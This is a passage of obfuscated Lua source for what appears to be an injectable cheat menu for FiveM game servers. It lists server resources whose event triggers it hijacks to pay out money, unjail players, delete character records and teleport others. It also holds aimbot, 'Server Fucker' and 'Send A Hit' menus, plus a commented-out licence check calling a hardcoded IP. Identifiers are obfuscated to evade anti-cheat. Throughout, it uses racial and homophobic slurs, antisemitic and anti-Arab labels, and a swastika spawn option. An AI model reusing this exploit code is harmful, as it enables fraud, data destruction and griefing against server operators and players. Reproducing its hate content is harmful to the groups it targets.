    resourcelooklike = {"trucker"},
    file = {"client/main.lua"},
    lookfor = ", amount",
    name = "truckerjob_pay",
    noparam = false,
    },

    {
    resource = "gopostal_job",
    resourcelooklike = {"gopostal"},
    file = {"client/cl.lua"},
    lookfor = ", currentJobPay",
    name = "gopostal_pay",
    noparam = false,
    },

    {
    resource = "esx-qalle-jail",
    resourcelooklike = {"jail"},
    file = {"client/client.lua"},
    lookfor = ", jailTime%)",
    name = "qalle_unjail",
    noparam = false,
    },

    {
    resource = "esx_status",
    resourcelooklike = {"status"},
    file = {"client/main.lua"},
    lookfor = ", function%(name, val%)",
    name = "esx_status_refillstatus",
    noparam = false,
    },

    {
    resource = "esx_policejob",
    resourcelooklike = {"police"},
    file = {"client/main.lua"},
    lookfor = ", GetPlayerServerId%b(), \'society_police\', _U%b(), data.current.amount",
    name = "send_bill",
    noparam = false,
    },

    {
    resource = "ESX_CommunityService",
    resourcelooklike = {"CommunityService"},
    file = {"client/main.lua"},
    lookfor = ", function%(source%)",
    name = "communityservice_finishservice",
    noparam = false,
    },
    
    {
    resource = "esx_garbagejob",
    resourcelooklike = {"garbage"},
    file = {"client/main.lua"},
    lookfor = ", amount%)",
    name = "garbagejob_pay",
    noparam = false,
    },

    {
    resource = "TakeHostage",
    resourcelooklike = {"hostage"},
    file = {"cl_takehostage.lua"},
    lookfor = ", closestPlayer,",
    name = "Hostage_Exploit",
    noparam = false,
    },

    {
    resource = "esx_moneywash",
    resourcelooklike = {"wash"},
    file = {"client/main.lua"},
    lookfor = ", amount, zone",
    name = "Money_Wash",
    noparam = false,
    },

    {
    resource = "esx_moneywash",
    resourcelooklike = {"wash"},
    file = {"config.lua"},   
    lookfor = "%] = %{",
    name = "Money_Wash_Zone",
    noparam = false
    },

    {
    resource = "esx_moneywash",
    resourcelooklike = {"wash"},
    file = {"client/main.lua"},
    lookfor = ", amount",
    name = "Money_Wash_Old",
    noparam = false,
    },

    {
    resource = "esx_kashacters",
    resourcelooklike = {"kashacters"},
    file = {"client/main.lua"},
    lookfor = ", data.charid%)",
    name = "delete_DB",
    noparam = false
    },

    {
    resource = "esx_bus",
    resourcelooklike = {"bus"},
    file = {"client/main.lua"},
    lookfor = ", amount%)",
    name = "buss_pay",
    noparam = false
    },

    {
    resource = "99kr-burglary",
    resourcelooklike = {"burglary"},
    file = {"burglary_client.lua"},
    lookfor = ", values.item, rndm%)",
    name = "free_items",
    noparam = false
    },

    {
    resource = "es_extended",
    resourcelooklike = {"extended"},
    file = {"client/common.lua"},
    lookfor = ", function%(cb%)",
    name = "esx_hook",
    noparam = false
    },

    {
    resource = "Badger_Tackle",
    resourcelooklike = {"tackle"},
    file = {"client/main.lua"},
    lookfor = ", GetPlayerServerId%(closestPlayer%)",
    name = "tp_all_to_me",
    noparam = false
    },

    {
    resource = "dp-emotes",
    resourcelooklike = {"emotes", "emote", "dpemotes"},
    file = {"client/Syncing.lua"},
    lookfor = ", GetPlayerServerId%(target%), requestedemote, otheremote",
    name = "emote_nigger",
    noparam = false
    },

    {
    resource = "rl-inventory",
    resourcelooklike = {"inventory"},
    file = {"client/main.lua"},
    lookfor = ', \"trunk\", CurrentVehicle, other',
    name = "open_inv_ghetto",
    noparam = false
    },

    {
    resource = "esx_hifi",
    resourcelooklike = {"hifi", "esx-hifi", "esx-sound", "esx_sound", "sound"},
    file = {"client/main.lua", "client.lua"},
    lookfor = ', data.value, coords',
    name = "play_da_sound",
    noparam = false
    },
}

-- I guess combos need their own table bc they are gay --
local REVMYmrswsZvxOXvJE = {
    dynam = {
        UpdateAllTriggers = function()
            RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                RfPsUKHSFWJuBEJuz.rE.LumWait(500)
                local allresources = jrnyLearIyzKiSIen.dynam.GetResources()
                for elcount, v in RfPsUKHSFWJuBEJuz.rE.LumIpairs(JHJzZjIJzisHI) do
                    for i = 0, #allresources do
                        local script = RfPsUKHSFWJuBEJuz.rE.LumString.LumLower(allresources[i])
                        if RfPsUKHSFWJuBEJuz.rE.LumTyper(v.resourcelooklike) == 'table' then
                            for E, JEJE in RfPsUKHSFWJuBEJuz.rE.Lumpairs(v.resourcelooklike) do
                                if RfPsUKHSFWJuBEJuz.rE.LumString.LumFind(script, JEJE) and  jrnyLearIyzKiSIen.dynam.GetResourceStatus(allresources[i]) then
                                    v.resource = allresources[i]
                                end
                            end
                        else
                            if RfPsUKHSFWJuBEJuz.rE.LumString.LumFind(script, v.resourcelooklike) and  jrnyLearIyzKiSIen.dynam.GetResourceStatus(allresources[i]) then
                                v.resource = allresources[i]
                            end
                        end
                    end
                end
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)
                for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(JHJzZjIJzisHI) do
                    DmSgpcIoUEJtyTfBBt.dynam.Conde_GetTrigger(v)
                    RfPsUKHSFWJuBEJuz.rE.LumWait(15)
                end
                --notify('Found '.. RfPsUKHSFWJuBEJuz.DAKdHpjJWWtmS.TriggersCount .. ' of ' .. #nlFXKkFxuKQAk .. ' known triggers')
            end)
        end
    },
    freec = {
        HandleFC = function()			
            local camCoords       = nlFXKkFxuKQAk.natives.GetCamCoord(jrnyLearIyzKiSIen.config.camf)			
            local right, forward  = DmSgpcIoUEJtyTfBBt.freec.CamRightVect(jrnyLearIyzKiSIen.config.camf), DmSgpcIoUEJtyTfBBt.freec.CamFwdVect(jrnyLearIyzKiSIen.config.camf)			
            local speedMultiplier = nil			
            nlFXKkFxuKQAk.natives.SetHdArea(camCoords.x, camCoords.y, camCoords.z, 50.0)			
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 21) then					
                speedMultiplier = 5.0				
            elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 36) then					
                speedMultiplier = 0.025				
            else					
                speedMultiplier = 0.25				
            end			
            local IONKCH = nlFXKkFxuKQAk.natives.UpdateOnscreenKeyboard() == 0			
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 32) and not IONKCH then					
                local newCamPos = camCoords + forward * speedMultiplier					
                nlFXKkFxuKQAk.natives.SetCamCoord(jrnyLearIyzKiSIen.config.camf, newCamPos.x, newCamPos.y, newCamPos.z)				
            end							
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 33) and not IONKCH then					
                local newCamPos = camCoords + forward * -speedMultiplier					
                nlFXKkFxuKQAk.natives.SetCamCoord(jrnyLearIyzKiSIen.config.camf, newCamPos.x, newCamPos.y, newCamPos.z)				
            end							
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 34) and not IONKCH then					
                local newCamPos = camCoords + right * -speedMultiplier					
                nlFXKkFxuKQAk.natives.SetCamCoord(jrnyLearIyzKiSIen.config.camf, newCamPos.x, newCamPos.y, newCamPos.z)				
            end							
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 30) and not IONKCH then					
                local newCamPos = camCoords + right * speedMultiplier					
                nlFXKkFxuKQAk.natives.SetCamCoord(jrnyLearIyzKiSIen.config.camf, newCamPos.x, newCamPos.y, newCamPos.z)				
            end			
            local xMagnitude = nlFXKkFxuKQAk.natives.GetDisabledControlNormal(0, 1);			
            local yMagnitude = nlFXKkFxuKQAk.natives.GetDisabledControlNormal(0, 2);			
            local camRot     = nlFXKkFxuKQAk.natives.GetCamRot(jrnyLearIyzKiSIen.config.camf, 0)			
            local x = camRot.x - yMagnitude * 10			
            local y = camRot.y			
            local z = camRot.z - xMagnitude * 10			
            if x < -75.0 then					
                x = -75.0				
            end							
            if x > 100.0 then					
                x = 100.0				
            end			
            nlFXKkFxuKQAk.natives.SetCamRot(jrnyLearIyzKiSIen.config.camf, x, y, z, 0)			
        end  
    },
    Qopt = {
        items = {'Health', 'Armor', 'Clean', 'Revive', 'Suicide'},
        values = {DmSgpcIoUEJtyTfBBt.FunFunc.ElSomeHealth, DmSgpcIoUEJtyTfBBt.FunFunc.ElSomeArmor, DmSgpcIoUEJtyTfBBt.FunFunc.ElCleanMe, DmSgpcIoUEJtyTfBBt.FunFunc.ElGetUpNow, DmSgpcIoUEJtyTfBBt.FunFunc.ElSuicideMe},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    AObj = {
        items = {'Soccer Ball', 'Christmas Tree', 'Ferris Wheel', 'Barge', 'Swastika'},
        values = {DmSgpcIoUEJtyTfBBt.FunFunc.ball, DmSgpcIoUEJtyTfBBt.FunFunc.ctreemen, DmSgpcIoUEJtyTfBBt.FunFunc.ferris, DmSgpcIoUEJtyTfBBt.FunFunc.barge, DmSgpcIoUEJtyTfBBt.FunFunc.swaz},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    HitMethod = {
        items = {'Walk Up', 'Suicide Bombing', 'Drive By', 'Fly By'},
        values = {1,2,3,4},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    HitManModle = {
        items = {'Default Danny', 'Jew Ped', 'Muscle Man', 'Bouncer', 'Union Depository Worker', 'Crazy Arab (Works In Some Servers)', 'Clone The Person Being Attacked', 'Clone A Player'},
        values = {'mp_m_freemode_01', 'a_m_m_hasjew_01', -636391810, -1613485779, -520477356, 100, 101, 102},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    VQopt = {
        items = {'Repair', 'Repair Engine', 'Clean', 'Flip', 'Unlock', 'Drive', 'Delete'},
        values = {DmSgpcIoUEJtyTfBBt.FunFunc.Fixerino, DmSgpcIoUEJtyTfBBt.FunFunc.FixerinoE, DmSgpcIoUEJtyTfBBt.FunFunc.Shinemecar, DmSgpcIoUEJtyTfBBt.FunFunc.unflipmeman, DmSgpcIoUEJtyTfBBt.FunFunc.unlockdacar, DmSgpcIoUEJtyTfBBt.FunFunc.elvroomvroom, DmSgpcIoUEJtyTfBBt.FunFunc.nomorecar},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Bopt = {
        items = {"Default", "2%", "5%", "10%", "25%", "50%", "100%", "200%", "500%", "1000%"},
        values = {1.0, 2.0, 5.0, 10.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt = {
        items = {'Vehicle Options', 'Los Santos Customs', 'Auto Drive'},
        values = {1, 2, 3},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    ADStyles = {
        items = {'Normal', 'Rushed', 'Reckless'},
        values = {786603, 1074528293, 6},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt2 = {
        items = {'Preformance', 'Cosmetics'},
        values = {false, true},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt3 = {
        items = {'Weapon Options', 'Aimbot Options'},
        values = {true, false},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt31 = {
        items = {'Silent', 'Hard Lock'},
        values = {1, 2},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt4 = {
        items = {'Visual', 'Server Fucker', 'Dynamic Triggers', 'Keybinds', 'Settings', 'Config'},
        values = {1, 2, 3, 4, 5, 6},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt4S = {
        items = {'Small', 'Medium'},
        values = {1, 2},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt5 = {
        items = {'General', 'General Trolling', 'Advanced Trolling', 'Send A Hit', 'Angry Peds'},
        values = {1, 2, 3, 4, 5},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    AngryNpcs = {
        items = {'Melee Weapons', 'Handheild Weapons', 'Heavy Weapons', '~r~All Weapons'},
        values = {1, 2, 3, 4},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    Mopt6 = {
        items = {'General', 'ESP'},
        values = {1, 2},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    ArmUp = {
        items = {'Stock', '20%', '40%', '60%', '80%', '100%'},
        values = {6, 5, 4, 3, 2, 1},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    EngUp = {
        items = {'Stock', 'Level 1', 'Level 2', 'Level 3', 'Level 4'},
        values = {5, 4, 3, 2, 1},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    TransUp = {
        items = {'Stock', 'Street', 'Sports', 'Race'},
        values = {4, 3, 2, 1},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    BrakeUp = {
        items = {'Stock', 'Street', 'Sports', 'Race'},
        values = {4, 3, 2, 1},
        currentItemIndex = 1,
        selectedItemIndex = 1  
    },
    SusUp = {
        items = {'Stock', 'Lowered', 'Street', 'Sport', 'Competion'},
        values = {5, 4, 3, 2, 1},
        currentItemIndex = 1,
        selectedItemIndex = 1
    },
    HornyHorn = {
        items = {},
        selectedItemIndex = 1,
        currentItemIndex = 1
    },
    WChanger = {
        items = {"Sport", "Muscle", "Lowrider", "SUV", "Offroad", "Tuner", "High End"},
        values = {0, 1, 2, 3, 4, 5, 7},
        selectedItemIndex = 1,
        currentItemIndex = 1
    },
    WChanger1 = {
        items = {},
        items2 = {},
        selectedItemIndex = 1,
        currentItemIndex = 1,
        selectedItemIndex2 = 1,
        currentItemIndex2 = 1
    },
    WColor = {
        items = {},
        values = {},
        selectedItemIndex = 1,
        currentItemIndex = 1
    },
    ReColor = {
        clasic = {},
        matte = {},
        metal = {},
        clasicval = {},
        matteval = {},
        metalval = {},
        SIIc = 1,
        CIIc = 1,
        SIImat = 1,
        CIImat = 1,
        SIImet = 1,
        CIImet = 1,
        SIIperl = 1,
        CIIperl = 1
    },
    UnderGC = {
        items = {'White', "Blue", "Electric Blue", "Mint Green", "Lime Green", "Yellow", "Golden Shower", "Orange", "Red", "Pony Pink", "Hot Pink", "Purple", "Blacklight"},
        values = {RfPsUKHSFWJuBEJuz.Colors.White, RfPsUKHSFWJuBEJuz.Colors.Blue, RfPsUKHSFWJuBEJuz.Colors.ElectricB, RfPsUKHSFWJuBEJuz.Colors.MintG, RfPsUKHSFWJuBEJuz.Colors.LimeG, RfPsUKHSFWJuBEJuz.Colors.Yellow, RfPsUKHSFWJuBEJuz.Colors.GoldenShower, RfPsUKHSFWJuBEJuz.Colors.Orange, RfPsUKHSFWJuBEJuz.Colors.Red, RfPsUKHSFWJuBEJuz.Colors.PonyPink, RfPsUKHSFWJuBEJuz.Colors.HotPink, RfPsUKHSFWJuBEJuz.Colors.Purple, RfPsUKHSFWJuBEJuz.Colors.Blacklight},
        selectedItemIndex = 1,
        currentItemIndex = 1
    },
    DmgMultiTasker = {
        items = {'None', '1.5x', '2.0x', '3.0x', '5.0x', '10.0x', '20.0x', '100.0x'},
        values = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 100.0},
        selectedItemIndex = 1,
        currentItemIndex = 1
    },
    Attachmentyea = {
        items = {'Suppresor', 'Flash Light', 'Grip', 'Extended Clip', 'Drum Mag'},
        values = {'suppressor', 'flashlight', 'grip', 'clip', 'drum'},
        selectedItemIndex = 1,
        currentItemIndex = 1
    },
    ABBone = {
        items = {'Head', 'Chest', 'R Leg', 'L Leg'},
        values = {31086, 0, 16335, 46078},
        selectedItemIndex = 1,
        currentItemIndex = 1
    },
    TrigOpts = {
        items = {'Fun Triggers', 'Money Triggers', 'Drug Related Triggers', 'VRP Triggers'},
        values = {'ftrigs', 'montrigs', 'drugreltrigs', 'vrptrigs'},
        selectedItemIndex = 1,
        currentItemIndex = 1
    }

}

local sx, sy = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
if sy <= 720 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.35
    jrnyLearIyzKiSIen.config.PointerScale = 0.40
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.58
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.63
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
elseif sy <= 900 and sy <= 1023 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.30
    jrnyLearIyzKiSIen.config.PointerScale = 0.35
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.50
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.55
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
elseif sy <= 1024 and sy <= 1999 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.25
    jrnyLearIyzKiSIen.config.PointerScale = 0.30
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.45
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.50
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
elseif sy <= 1200 and sy <= 1049 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.20
    jrnyLearIyzKiSIen.config.PointerScale = 0.25
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.35
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.40
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
elseif sy <= 1050 and sy <= 1079 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.25
    jrnyLearIyzKiSIen.config.PointerScale = 0.30
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.40
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.45
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
elseif sy <= 1080 and sy <= 1439 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.25
    jrnyLearIyzKiSIen.config.PointerScale = 0.30
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.40
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.45
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
elseif sy <= 1440 and sy <= 2159 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.20
    jrnyLearIyzKiSIen.config.PointerScale = 0.25
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.30
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.35
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
elseif sy >= 2160 then
    jrnyLearIyzKiSIen.config.ButtonScale = 0.10
    jrnyLearIyzKiSIen.config.PointerScale = 0.12
    jrnyLearIyzKiSIen.config.SubMenuScale = 0.17
    jrnyLearIyzKiSIen.config.FreeCamScale = 0.20
    jrnyLearIyzKiSIen.config.MainX = (sx / 2) - 75
    jrnyLearIyzKiSIen.config.MainY = (sy / 2) - 50
end

-- Texture Importing --
DmSgpcIoUEJtyTfBBt.RandomStringGen = function(length)
    local res = '';
    length = length or 20;
    for _i = 1, length do
        local _abc = RfPsUKHSFWJuBEJuz.rE.LumString.LumChar(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(97, 122))
        if (RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(1, 3) == 1 ) then
            _abc = RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(_abc)
        end
        res = res .. _abc
    end
    if jrnyLearIyzKiSIen.func.Random_stringcontains(jrnyLearIyzKiSIen.DSR, res) then
        RfPsUKHSFWJuBEJuz.rE.pront("Repeated string, generating again.")
        return DmSgpcIoUEJtyTfBBt.RandomStringGen(length)
    end
    RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(jrnyLearIyzKiSIen.DSR, res)
    return res
end
local megarollaon
local NeekerMan = DmSgpcIoUEJtyTfBBt.RandomStringGen(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(10, 15));
local NeekerMan1 = DmSgpcIoUEJtyTfBBt.RandomStringGen(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(10, 15));
local TickyR1 = DmSgpcIoUEJtyTfBBt.RandomStringGen(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(10, 15));
local TickyR2 = DmSgpcIoUEJtyTfBBt.RandomStringGen(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(10, 15));
local TDict = nlFXKkFxuKQAk.natives.CreateRuntimeTxd(NeekerMan)
local TDict2 = nlFXKkFxuKQAk.natives.CreateRuntimeTxd(NeekerMan1)
local dui = nlFXKkFxuKQAk.natives.GetDuiHandle(nlFXKkFxuKQAk.natives.CreateDui('https://i.imgur.com/e5nowXb.png', 255, 255))
nlFXKkFxuKQAk.natives.CreateRuntimeTextureFromDuiHandle(TDict, TickyR1, dui)
local dui2 = nlFXKkFxuKQAk.natives.GetDuiHandle(nlFXKkFxuKQAk.natives.CreateDui('https://i.imgur.com/SmUsZY3.png', 255, 255))
nlFXKkFxuKQAk.natives.CreateRuntimeTextureFromDuiHandle(TDict2, TickyR2, dui2)

DmSgpcIoUEJtyTfBBt.Mfunc.CheckScb(DmSgpcIoUEJtyTfBBt.Mfunc.DrawNotification)
REVMYmrswsZvxOXvJE.dynam.UpdateAllTriggers()
jrnyLearIyzKiSIen.config.dienow = true
jrnyLearIyzKiSIen.config.openkeydefine = true
jrnyLearIyzKiSIen.config.breathon = true

-- Big Check If Has Sub --    
-- if nlFXKkFxuKQAk.natives.BigCheckerino() == 1 then
--     local Id = nlFXKkFxuKQAk.natives.rEUid()
--     local isBan = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/mod/check/"..Id.."", nil, 'get'))
--     if isBan == nil then
--         DmSgpcIoUEJtyTfBBt.Mfunc.CheckScb(DmSgpcIoUEJtyTfBBt.Mfunc.DrawNotification)
--         REVMYmrswsZvxOXvJE.dynam.UpdateAllTriggers()
--         jrnyLearIyzKiSIen.config.dienow = true
--         jrnyLearIyzKiSIen.config.openkeydefine = true
--         jrnyLearIyzKiSIen.config.breathon = true
--     elseif isBan.check == 'ban' then
--         -- Yell At User --
--         RfPsUKHSFWJuBEJuz.rE.pront('Sorry! Currently You Are Banned... If You Would Like To Inquire About Your Ban Please Create A Ticket In The Lumia Discord.')
--         -- Lock Menu --
--         jrnyLearIyzKiSIen.config.dienow = false
--         jrnyLearIyzKiSIen.config.openkeydefine = false
--         jrnyLearIyzKiSIen.config.breathon = false
--         return
--     elseif isBan.check == 'err' then
--         -- Yell At User --
--         RfPsUKHSFWJuBEJuz.rE.pront('Please Try Again!')
--         -- Lock Menu --
--         jrnyLearIyzKiSIen.config.dienow = false
--         jrnyLearIyzKiSIen.config.openkeydefine = false
--         jrnyLearIyzKiSIen.config.breathon = false
--         return
--     elseif isBan.check == 'good' then
--         -- Unlock Menu --
        -- DmSgpcIoUEJtyTfBBt.Mfunc.CheckScb(DmSgpcIoUEJtyTfBBt.Mfunc.DrawNotification)
        -- REVMYmrswsZvxOXvJE.dynam.UpdateAllTriggers()
        -- nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/cc/boom", nil, 'get')
        -- nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/config/create/"..Id.."", nil, 'get')
        -- jrnyLearIyzKiSIen.config.dienow = true
        -- jrnyLearIyzKiSIen.config.openkeydefine = true
        -- jrnyLearIyzKiSIen.config.breathon = true
--     end
-- else
--     -- Yell At User --
--     RfPsUKHSFWJuBEJuz.rE.pront('Trying To Inject Without A Sub? Doesnt make sense unless its a leak!')
--     -- Lock Menu --
--     jrnyLearIyzKiSIen.config.dienow = false
--     jrnyLearIyzKiSIen.config.openkeydefine = false
--     jrnyLearIyzKiSIen.config.breathon = false
--     return
-- end

-- Lumia Console --
RfPsUKHSFWJuBEJuz.Console.ConsoleParser = function(a)
    if a == nil then return end
    local args = {}
    RfPsUKHSFWJuBEJuz.Console.error = function(c) 
        RfPsUKHSFWJuBEJuz.rE.pront('ERROR: bad paramater "'..c..'".')
    end
    RfPsUKHSFWJuBEJuz.Console.nilCheck = function(arg, amount)
        for i = 1, amount do
            if arg[i] == nil then
                RfPsUKHSFWJuBEJuz.Console.error(i - 1)
                return false
            end
        end
        return true
    end
    RfPsUKHSFWJuBEJuz.Console.ToggleCheck = function(d)
        if d ~= 'true' and d ~= 'false' then
            RfPsUKHSFWJuBEJuz.Console.error(d)
        else
            if d == 'true' then 
                return true
            elseif d == 'false' then
                return false
            end
        end
    end
    RfPsUKHSFWJuBEJuz.Console.argSplit = function(b)
        local sep = "%s"
        for arg in RfPsUKHSFWJuBEJuz.rE.LumString.LumGmatch(b, "([^"..sep.."]+)") do
            local FormatedArg = RfPsUKHSFWJuBEJuz.rE.LumString.LumLower(arg)
            RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(args, FormatedArg)
        end
    end
    RfPsUKHSFWJuBEJuz.Console.argSplit(a)    
    if args[1] == '/god' then 
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.SupaJesusMode = backup
        end
    elseif args[1] == '/norag' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.noragmen = backup
        end
    elseif args[1] == '/nocrit' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.nocritsmen = backup
        end
    elseif args[1] == '/invis' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.SupaNoSee = backup
        end
    elseif args[1] == '/superrun' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.SupaRoon = backup
        end
    elseif args[1] == '/superjump' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.SupaJumpski = backup
        end
    elseif args[1] == '/infstamina' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.SupaStamina = backup
        end
    elseif args[1] == '/infcbr' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.RollaForever = backup
        end
    elseif args[1] == '/freecam' then
        local backup = RfPsUKHSFWJuBEJuz.Console.ToggleCheck(args[2])
        if backup ~= nil then
            jrnyLearIyzKiSIen.config.features.ToggleFreeCam = backup
            DmSgpcIoUEJtyTfBBt.freec.FreeCamToggle()
        end
    elseif args[1] == '/tpw' then
        local Waypointy = nlFXKkFxuKQAk.natives.GetFirstBlipInfoId(8) 
        if nlFXKkFxuKQAk.natives.DoesBlipExist(Waypointy) then
            DmSgpcIoUEJtyTfBBt.FunFunc.TeleToWP()
        end
    elseif args[1] == '/tpc' then
        if RfPsUKHSFWJuBEJuz.Console.nilCheck(args, 4) then
            nlFXKkFxuKQAk.natives.SetPedCoordsKeepVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), RfPsUKHSFWJuBEJuz.rE.LumToNum(args[2]), RfPsUKHSFWJuBEJuz.rE.LumToNum(args[3]), RfPsUKHSFWJuBEJuz.rE.LumToNum(args[4]))
        end
    elseif args[1] == '/ctw' then
        if RfPsUKHSFWJuBEJuz.Console.nilCheck(args, 3) then
            nlFXKkFxuKQAk.natives.SetNewWaypoint(RfPsUKHSFWJuBEJuz.rE.LumToNum(args[2]), RfPsUKHSFWJuBEJuz.rE.LumToNum(args[3]))
        end
    elseif args[1] == '/revive' then
        DmSgpcIoUEJtyTfBBt.FunFunc.ElGetUpNow()
    elseif args[1] == '/car' then
        if RfPsUKHSFWJuBEJuz.Console.nilCheck(args, 2) then
            if nlFXKkFxuKQAk.natives.IsModelValid(args[2]) then
                DmSgpcIoUEJtyTfBBt.FunFunc.spawnvehicle(args[2])
            end
        end
    elseif args[1] == '/maxveh' then
        nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0)
        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 11, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 11) - 1, false)
        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 13, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 13) - 1, false)
        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 12, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 12) - 1, false)
        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 15, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 15) - 1, false)
